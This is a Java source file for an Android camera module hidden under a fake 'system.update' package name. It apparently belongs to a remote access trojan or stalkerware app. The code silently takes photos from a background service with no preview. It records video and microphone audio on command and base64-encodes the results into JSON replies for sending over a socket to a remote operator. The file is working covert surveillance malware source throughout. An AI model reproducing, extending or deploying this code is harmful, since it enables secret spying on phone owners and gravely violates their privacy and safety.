package com.android.system.update.modules;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.Log;
import android.util.Size;
import android.view.Surface;

import androidx.core.app.ActivityCompat;

import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

public class CameraModule {
    private static final String TAG = "CameraModule";

    // ── How long to let the sensor/AE warm up before firing the capture.
    // 1500ms is reliable on mid-range devices without a live preview surface.
    private static final long   WARMUP_MS           = 1500;
    private static final int    CAPTURE_TIMEOUT_MS  = 15000;
    private static final int    MAX_RETRY_ATTEMPTS  = 2;

    private final Context       context;
    private final CameraManager cameraManager;
    private final Handler       backgroundHandler;
    private final HandlerThread backgroundThread;

    private String  currentCameraId;
    private String  backCameraId;
    private String  frontCameraId;
    private boolean isUsingFrontCamera = false;

    private ImageReader          imageReader;
    private CameraDevice         cameraDevice;
    private CameraCaptureSession captureSession;

    private MediaRecorder videoRecorder;
    private boolean       isRecordingVideo = false;
    private String        currentVideoPath;

    // ── Constructor ───────────────────────────────────────────────────────────

    public CameraModule(Context context) {
        this.context       = context;
        this.cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        backgroundThread   = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
        findCameras();
    }

    // ── Camera discovery ──────────────────────────────────────────────────────

    private void findCameras() {
        try {
            for (String id : cameraManager.getCameraIdList()) {
                CameraCharacteristics c = cameraManager.getCameraCharacteristics(id);
                Integer facing = c.get(CameraCharacteristics.LENS_FACING);
                if (facing == null) continue;
                if (facing == CameraCharacteristics.LENS_FACING_BACK)  backCameraId  = id;
                if (facing == CameraCharacteristics.LENS_FACING_FRONT) frontCameraId = id;
            }
            currentCameraId    = backCameraId != null ? backCameraId : frontCameraId;
            isUsingFrontCamera = currentCameraId != null && currentCameraId.equals(frontCameraId);
            Log.d(TAG, "Cameras — back:" + backCameraId + " front:" + frontCameraId
                    + " current:" + currentCameraId);
        } catch (Exception e) {
            Log.e(TAG, "findCameras error", e);
        }
    }

    // ── Switch camera ─────────────────────────────────────────────────────────

    public String switchCamera() {
        closeCamera();
        if (isUsingFrontCamera) {
            if (backCameraId == null)  return "ERROR: No back camera";
            currentCameraId = backCameraId;  isUsingFrontCamera = false;
            return "SUCCESS: Switched to back camera";
        } else {
            if (frontCameraId == null) return "ERROR: No front camera";
            currentCameraId = frontCameraId; isUsingFrontCamera = true;
            return "SUCCESS: Switched to front camera";
        }
    }

    public String getCurrentCamera() { return isUsingFrontCamera ? "front" : "back"; }

    // ── Resource management ───────────────────────────────────────────────────

    private synchronized void closeCamera() {
        try { if (captureSession != null) { captureSession.close(); captureSession = null; } } catch (Exception ignored) {}
        try { if (cameraDevice   != null) { cameraDevice.close();   cameraDevice   = null; } } catch (Exception ignored) {}
        try { if (imageReader    != null) { imageReader.close();     imageReader    = null; } } catch (Exception ignored) {}
    }

    private boolean checkPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
                == PackageManager.PERMISSION_GRANTED;
    }

    // ── Size helpers ──────────────────────────────────────────────────────────

    /**
     * Returns the largest JPEG size up to ~12 MP (4032 × 3024).
     * Capping prevents excessively large base64 payloads over the socket.
     */
    private Size getBestPhotoSize() {
        try {
            StreamConfigurationMap m = cameraManager
                    .getCameraCharacteristics(currentCameraId)
                    .get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            if (m == null) return new Size(3840, 2160);
            Size[] sizes = m.getOutputSizes(ImageFormat.JPEG);
            if (sizes == null || sizes.length == 0) return new Size(3840, 2160);
            Size best = sizes[0];
            for (Size s : sizes) {
                if ((long) s.getWidth() * s.getHeight() > (long) best.getWidth() * best.getHeight()
                        && s.getWidth() <= 4032 && s.getHeight() <= 3024) {
                    best = s;
                }
            }
            Log.d(TAG, "Best photo size: " + best.getWidth() + "×" + best.getHeight());
            return best;
        } catch (Exception e) { return new Size(3840, 2160); }
    }

    /** Prefers 1080p; falls back to the largest size ≤ 1080p. */
    private Size getBestVideoSize() {
        try {
            StreamConfigurationMap m = cameraManager
                    .getCameraCharacteristics(currentCameraId)
                    .get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            if (m == null) return new Size(1280, 720);
            Size[] sizes = m.getOutputSizes(MediaRecorder.class);
            if (sizes == null || sizes.length == 0) return new Size(1280, 720);
            for (Size s : sizes) if (s.getWidth() == 1920 && s.getHeight() == 1080) return s;
            Size best = sizes[0];
            for (Size s : sizes) {
                if (s.getWidth() <= 1920 && s.getHeight() <= 1080
                        && (long) s.getWidth() * s.getHeight()
                           > (long) best.getWidth() * best.getHeight()) {
                    best = s;
                }
            }
            return best;
        } catch (Exception e) { return new Size(1280, 720); }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  takePhoto
    //
    //  Strategy: open camera → start a repeating PREVIEW request → wait
    //  WARMUP_MS for AE/AF to settle → fire one STILL_CAPTURE request →
    //  wait for the image.
    //
    //  The repeating preview request is key: it drives the camera ISP and
    //  lets AE converge even from a background service with no display surface.
    //  We use the same ImageReader surface for both the preview frames (which
    //  we discard) and the final still capture.
    // ─────────────────────────────────────────────────────────────────────────

    public String takePhoto() {
        if (!checkPermission())      return "ERROR: No camera permission";
        if (currentCameraId == null) return "ERROR: No camera available";

        for (int attempt = 0; attempt < MAX_RETRY_ATTEMPTS; attempt++) {
            closeCamera();
            String r = doTakePhoto();
            if (!r.startsWith("ERROR")) return r;
            Log.w(TAG, "Photo attempt " + (attempt + 1) + " failed: " + r);
            try { Thread.sleep(700); } catch (InterruptedException ignored) {}
        }
        return "ERROR: All capture attempts failed";
    }

    private String doTakePhoto() {
        final AtomicReference<String> result  = new AtomicReference<>(null);
        final CountDownLatch           latch   = new CountDownLatch(1);
        final AtomicBoolean            fired   = new AtomicBoolean(false);

        try {
            Size photoSize = getBestPhotoSize();
            Log.d(TAG, "Photo size: " + photoSize.getWidth() + "×" + photoSize.getHeight());

            imageReader = ImageReader.newInstance(
                    photoSize.getWidth(), photoSize.getHeight(), ImageFormat.JPEG, 3);

            // The listener captures whichever image arrives AFTER we fire the
            // still-capture request (i.e. we ignore preview frames by checking fired).
            imageReader.setOnImageAvailableListener(reader -> {
                if (!fired.get()) return; // still in warm-up — discard preview frame
                try (Image img = reader.acquireLatestImage()) {
                    if (img == null) return;
                    ByteBuffer buf   = img.getPlanes()[0].getBuffer();
                    byte[]     bytes = new byte[buf.remaining()];
                    buf.get(bytes);
                    result.set(Base64.encodeToString(bytes, Base64.NO_WRAP));
                    Log.d(TAG, "Photo encoded: " + bytes.length + " bytes");
                } catch (Exception e) {
                    result.set("ERROR: " + e.getMessage());
                } finally {
                    latch.countDown();
                }
            }, backgroundHandler);

            cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice device) {
                    cameraDevice = device;
                    try {
                        List<Surface> surfaces = new ArrayList<>();
                        surfaces.add(imageReader.getSurface());

                        device.createCaptureSession(surfaces,
                                new CameraCaptureSession.StateCallback() {
                                    @Override
                                    public void onConfigured(CameraCaptureSession session) {
                                        captureSession = session;
                                        try {
                                            startWarmupThenCapture(session, device, result, latch, fired);
                                        } catch (Exception e) {
                                            result.set("ERROR: " + e.getMessage());
                                            latch.countDown();
                                        }
                                    }
                                    @Override
                                    public void onConfigureFailed(CameraCaptureSession s) {
                                        result.set("ERROR: Session configure failed");
                                        latch.countDown();
                                    }
                                }, backgroundHandler);
                    } catch (Exception e) {
                        result.set("ERROR: " + e.getMessage());
                        latch.countDown();
                    }
                }
                @Override public void onDisconnected(CameraDevice d) {
                    d.close(); result.set("ERROR: Camera disconnected"); latch.countDown();
                }
                @Override public void onError(CameraDevice d, int e) {
                    d.close(); result.set("ERROR: Camera error " + e); latch.countDown();
                }
            }, backgroundHandler);

            boolean done = latch.await(CAPTURE_TIMEOUT_MS, TimeUnit.MILLISECONDS);
            closeCamera();
            if (!done)              return "ERROR: Capture timeout";
            if (result.get() == null) return "ERROR: No result";
            return result.get();

        } catch (Exception e) {
            closeCamera();
            return "ERROR: " + e.getMessage();
        }
    }

    /**
     * Starts a repeating PREVIEW request to warm up AE/AF.
     * After WARMUP_MS, atomically marks fired=true and issues STILL_CAPTURE.
     */
    private void startWarmupThenCapture(
            CameraCaptureSession session,
            CameraDevice device,
            AtomicReference<String> result,
            CountDownLatch latch,
            AtomicBoolean fired) throws CameraAccessException {

        CaptureRequest.Builder previewBuilder =
                device.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
        previewBuilder.addTarget(imageReader.getSurface());
        previewBuilder.set(CaptureRequest.CONTROL_MODE,    CaptureRequest.CONTROL_MODE_AUTO);
        previewBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
        previewBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);

        session.setRepeatingRequest(previewBuilder.build(), null, backgroundHandler);
        Log.d(TAG, "Preview started — waiting " + WARMUP_MS + "ms for AE/AF to settle");

        // After warmup delay, stop preview and fire still capture
        backgroundHandler.postDelayed(() -> {
            try {
                session.stopRepeating();

                // Mark fired BEFORE sending the capture request so the
                // ImageAvailableListener knows to keep the next image.
                fired.set(true);

                CaptureRequest.Builder stillBuilder =
                        device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                stillBuilder.addTarget(imageReader.getSurface());
                stillBuilder.set(CaptureRequest.JPEG_QUALITY,    (byte) 97);
                stillBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                stillBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
                stillBuilder.set(CaptureRequest.JPEG_ORIENTATION, getSensorOrientation());
                stillBuilder.set(CaptureRequest.CONTROL_CAPTURE_INTENT,
                        CaptureRequest.CONTROL_CAPTURE_INTENT_STILL_CAPTURE);

                session.capture(stillBuilder.build(),
                        new CameraCaptureSession.CaptureCallback() {
                            @Override
                            public void onCaptureFailed(CameraCaptureSession s,
                                    CaptureRequest req, CaptureFailure failure) {
                                result.set("ERROR: Capture failed (reason=" + failure.getReason() + ")");
                                latch.countDown();
                            }
                        }, backgroundHandler);

                Log.d(TAG, "Still capture request fired");
            } catch (Exception e) {
                result.set("ERROR: " + e.getMessage());
                latch.countDown();
            }
        }, WARMUP_MS);
    }

    private int getSensorOrientation() {
        try {
            Integer o = cameraManager.getCameraCharacteristics(currentCameraId)
                    .get(CameraCharacteristics.SENSOR_ORIENTATION);
            return o != null ? o : 90;
        } catch (Exception e) { return 90; }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Video recording
    // ─────────────────────────────────────────────────────────────────────────

    public String startRecording(String args) {
        if (!checkPermission())      return "ERROR: No camera permission";
        if (isRecordingVideo)        return "ERROR: Already recording";
        if (currentCameraId == null) return "ERROR: No camera available";

        int maxDurationSec = 60;
        if (args != null && !args.isEmpty()) {
            try { maxDurationSec = Integer.parseInt(args.trim()); } catch (NumberFormatException ignored) {}
        }

        closeCamera();
        final CountDownLatch         latch = new CountDownLatch(1);
        final AtomicReference<String> sr   = new AtomicReference<>(null);

        try {
            Size videoSize = getBestVideoSize();
            Log.d(TAG, "Video size: " + videoSize.getWidth() + "×" + videoSize.getHeight());

            File dir = context.getExternalFilesDir("videos");
            if (dir != null && !dir.exists()) dir.mkdirs();
            String ts = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
            currentVideoPath = (dir != null ? dir.getAbsolutePath()
                                            : context.getCacheDir().getAbsolutePath())
                    + "/VID_" + ts + ".mp4";

            videoRecorder = new MediaRecorder();
            videoRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            videoRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            videoRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            videoRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            videoRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            videoRecorder.setVideoSize(videoSize.getWidth(), videoSize.getHeight());
            videoRecorder.setVideoFrameRate(30);
            videoRecorder.setVideoEncodingBitRate(6_000_000);
            videoRecorder.setAudioEncodingBitRate(192_000);
            videoRecorder.setAudioSamplingRate(44100);
            videoRecorder.setMaxDuration(maxDurationSec * 1000);
            videoRecorder.setOutputFile(currentVideoPath);
            videoRecorder.prepare();

            final Surface recorderSurface = videoRecorder.getSurface();

            // Small dummy ImageReader — some devices need ≥2 output surfaces
            imageReader = ImageReader.newInstance(320, 240, ImageFormat.YUV_420_888, 2);
            imageReader.setOnImageAvailableListener(
                    r -> { try (Image i = r.acquireLatestImage()) { /* discard */ } catch (Exception ignored) {} },
                    backgroundHandler);

            cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice device) {
                    cameraDevice = device;
                    try {
                        List<Surface> surfaces = new ArrayList<>();
                        surfaces.add(recorderSurface);
                        surfaces.add(imageReader.getSurface());
                        device.createCaptureSession(surfaces,
                                new CameraCaptureSession.StateCallback() {
                                    @Override public void onConfigured(CameraCaptureSession session) {
                                        captureSession = session;
                                        try {
                                            CaptureRequest.Builder b =
                                                    device.createCaptureRequest(CameraDevice.TEMPLATE_RECORD);
                                            b.addTarget(recorderSurface);
                                            b.addTarget(imageReader.getSurface());
                                            b.set(CaptureRequest.CONTROL_MODE,    CaptureRequest.CONTROL_MODE_AUTO);
                                            b.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_VIDEO);
                                            b.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
                                            session.setRepeatingRequest(b.build(), null, backgroundHandler);
                                            videoRecorder.start();
                                            isRecordingVideo = true;
                                            sr.set("SUCCESS: Recording started — " + currentVideoPath);
                                            Log.d(TAG, "🎥 Recording started: " + currentVideoPath);
                                        } catch (Exception e) {
                                            sr.set("ERROR: " + e.getMessage());
                                        } finally { latch.countDown(); }
                                    }
                                    @Override public void onConfigureFailed(CameraCaptureSession s) {
                                        sr.set("ERROR: Session configure failed"); latch.countDown();
                                    }
                                }, backgroundHandler);
                    } catch (Exception e) { sr.set("ERROR: " + e.getMessage()); latch.countDown(); }
                }
                @Override public void onDisconnected(CameraDevice d) {
                    d.close(); sr.set("ERROR: Camera disconnected"); latch.countDown();
                }
                @Override public void onError(CameraDevice d, int e) {
                    d.close(); sr.set("ERROR: Camera error " + e); latch.countDown();
                }
            }, backgroundHandler);

            latch.await(8, TimeUnit.SECONDS);
            return sr.get() != null ? sr.get() : "ERROR: Timeout starting recording";

        } catch (Exception e) {
            Log.e(TAG, "startRecording error", e);
            releaseVideoRecorder();
            return "ERROR: " + e.getMessage();
        }
    }

    public String stopRecording() {
        if (!isRecordingVideo) return "ERROR: No active recording";
        try {
            isRecordingVideo = false;
            try { if (captureSession != null) captureSession.stopRepeating(); } catch (Exception ignored) {}
            closeCamera();
            releaseVideoRecorder();

            File f = new File(currentVideoPath);
            if (!f.exists() || f.length() == 0) return "ERROR: Video file empty or missing";

            Log.d(TAG, "🎥 Video saved: " + f.length() + " bytes → encoding...");
            byte[] bytes = readFileToBytes(f);
            String b64   = Base64.encodeToString(bytes, Base64.NO_WRAP);

            JSONObject resp = new JSONObject();
            resp.put("command",   "video_recording_result");
            resp.put("status",    "success");
            resp.put("file_name", f.getName());
            resp.put("file_size", f.length());
            resp.put("file_data", b64);
            resp.put("path",      f.getAbsolutePath());
            return resp.toString();

        } catch (Exception e) {
            Log.e(TAG, "stopRecording error", e);
            return "ERROR: " + e.getMessage();
        }
    }

    private void releaseVideoRecorder() {
        if (videoRecorder != null) {
            try { videoRecorder.stop();    } catch (Exception ignored) {}
            try { videoRecorder.reset();   } catch (Exception ignored) {}
            try { videoRecorder.release(); } catch (Exception ignored) {}
            videoRecorder = null;
        }
    }

    // ── Diagnostics ───────────────────────────────────────────────────────────

    public String captureTestImage() { return takePhoto(); }

    public String testCapture() {
        if (!checkPermission()) return "ERROR: No camera permission";
        CountDownLatch latch = new CountDownLatch(1);
        AtomicReference<String> r = new AtomicReference<>("Failed");
        try {
            cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice d) { d.close(); r.set("SUCCESS"); latch.countDown(); }
                @Override public void onDisconnected(CameraDevice d) { r.set("ERROR: Disconnected"); latch.countDown(); }
                @Override public void onError(CameraDevice d, int e)  { r.set("ERROR: " + e); latch.countDown(); }
            }, backgroundHandler);
            latch.await(5, TimeUnit.SECONDS);
            return r.get();
        } catch (Exception e) { return "ERROR: " + e.getMessage(); }
    }

    public String testCamera() {
        if (!checkPermission()) return "ERROR: No camera permission";
        try {
            CameraCharacteristics c = cameraManager.getCameraCharacteristics(currentCameraId);
            Integer facing = c.get(CameraCharacteristics.LENS_FACING);
            String f = facing != null && facing == CameraCharacteristics.LENS_FACING_BACK ? "BACK" : "FRONT";
            return "SUCCESS: Camera " + currentCameraId + " (" + f + ")";
        } catch (Exception e) { return "ERROR: " + e.getMessage(); }
    }

    public String testCamera2() {
        if (!checkPermission()) return "ERROR: No camera permission";
        try {
            StringBuilder sb = new StringBuilder("Camera report:\n");
            for (String id : cameraManager.getCameraIdList()) {
                CameraCharacteristics c = cameraManager.getCameraCharacteristics(id);
                Integer facing = c.get(CameraCharacteristics.LENS_FACING);
                String f = facing != null && facing == CameraCharacteristics.LENS_FACING_BACK ? "BACK" : "FRONT";
                sb.append("Camera ").append(id).append(" (").append(f).append(")\n");
                StreamConfigurationMap m = c.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
                if (m != null) {
                    Size[] js = m.getOutputSizes(ImageFormat.JPEG);
                    if (js != null && js.length > 0)
                        sb.append("  Max JPEG: ").append(js[0].getWidth()).append("×").append(js[0].getHeight()).append("\n");
                    Size[] vs = m.getOutputSizes(MediaRecorder.class);
                    if (vs != null && vs.length > 0)
                        sb.append("  Max Video: ").append(vs[0].getWidth()).append("×").append(vs[0].getHeight()).append("\n");
                }
            }
            return "SUCCESS: " + sb;
        } catch (Exception e) { return "ERROR: " + e.getMessage(); }
    }

    public String checkCameraStatus() {
        try {
            StringBuilder sb = new StringBuilder();
            for (String id : cameraManager.getCameraIdList()) {
                CameraCharacteristics c = cameraManager.getCameraCharacteristics(id);
                Integer facing = c.get(CameraCharacteristics.LENS_FACING);
                String f = facing != null && facing == CameraCharacteristics.LENS_FACING_BACK ? "BACK" : "FRONT";
                sb.append("Camera ").append(id).append(" (").append(f).append(")")
                  .append(id.equals(currentCameraId) ? " [CURRENT]" : "").append("\n");
            }
            return "SUCCESS: " + sb;
        } catch (Exception e) { return "ERROR: " + e.getMessage(); }
    }

    public String simpleTest() {
        try {
            Integer lvl = cameraManager.getCameraCharacteristics(currentCameraId)
                    .get(CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL);
            String s = lvl == null ? "UNKNOWN" :
                    lvl == CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL_FULL    ? "FULL"    :
                    lvl == CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL_LIMITED ? "LIMITED" :
                    lvl == CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL_LEGACY  ? "LEGACY"  : "LEVEL_3";
            return "SUCCESS: Hardware level: " + s;
        } catch (Exception e) { return "ERROR: " + e.getMessage(); }
    }

    public String simpleCapture() { return "SUCCESS: Camera accessible"; }

    // ── Helpers ───────────────────────────────────────────────────────────────

    private byte[] readFileToBytes(File f) throws IOException {
        try (FileInputStream fis = new FileInputStream(f)) {
            byte[] b = new byte[(int) f.length()]; fis.read(b); return b;
        }
    }

    public void cleanup() {
        closeCamera();
        releaseVideoRecorder();
        backgroundThread.quitSafely();
        try { backgroundThread.join(); } catch (InterruptedException ignored) {}
    }
}
